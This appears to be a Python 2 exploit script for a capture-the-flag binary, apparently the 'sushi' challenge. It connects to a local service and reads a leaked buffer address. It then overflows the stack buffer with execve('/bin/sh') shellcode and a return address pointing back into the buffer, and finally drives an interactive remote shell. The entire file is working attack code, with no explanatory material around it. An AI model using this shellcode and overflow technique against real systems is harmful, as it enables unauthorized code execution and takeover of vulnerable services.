import socket
import struct
import re

def rop(*args):  # 'Q' and not 'I' for x64
    return struct.pack('Q'*len(args), *args)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

s = socket.create_connection(('127.0.0.1', 4444))

buffer_addr = re.search('^Deposit money for sushi here: (.+)$', s.recv(1024)).group(1)
buffer_addr = int(buffer_addr, 16)

s.send(shellcode + 'A'*(72 - len(shellcode)) + rop(buffer_addr) + '\n')
s.recv(1024)

while(True):
    s.send(raw_input('$ ') + '\n')
    print(s.recv(1024))
s.close()
